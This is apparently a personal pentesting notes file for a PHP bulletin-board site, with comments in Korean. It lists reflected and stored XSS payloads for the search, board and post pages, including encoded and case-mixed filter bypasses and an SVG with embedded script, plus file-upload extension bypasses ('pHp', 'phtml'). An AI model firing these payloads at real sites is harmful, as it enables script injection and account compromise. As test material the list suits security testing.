# Payloads

## XSS

### Attack surfaces

- 게시글 검색 `search.php`의 `q` 파라미터

- 게시판 선택 시 `board.php`의 `page` 파라미터

- 글 생성 및 댓글 생성 `post.php` | `stored xss` 

### Payloads

<!-- 검색하는 곳; 숫자 및 문자열 삽입-->
`/search.php?q=<script>alert%287%29<%2Fscript>`

`/search.php?q=<script>alert%28%27test%27%29<%2Fscript>`

`/search.php?q=<img+src%3Dx+onerror%3D"%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041">`

<!-- Unicode encoding -->
`/search.php?q=<script>%5Cu0061lert%281%29<%2Fscript>`

`/search.php?q=<object+data%3D"data%3Atext%2Fhtml%2C<script>alert%281%29<%2Fscript>">`

<!-- 글 생성 및 출력되는 곳-->
<!-- 댓글 생성 및 출력되는 곳-->
`GET /post.php`

`/board.php?page=2<ScRiPt>alert(%27page%27)</sCripT>`

`/index.php?page=2xssz"><img/src=x%20onerror=confirm(999)><!--`

`/post.php?id=41"><img/src=x%20onerror=confirm(999)><!--&board=3`




<!-- svg file -->
```svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert('xss');
   </script>
</svg>
```


## SQL Injection

## File upload

### 우회 확장자

`pHp` `phtml`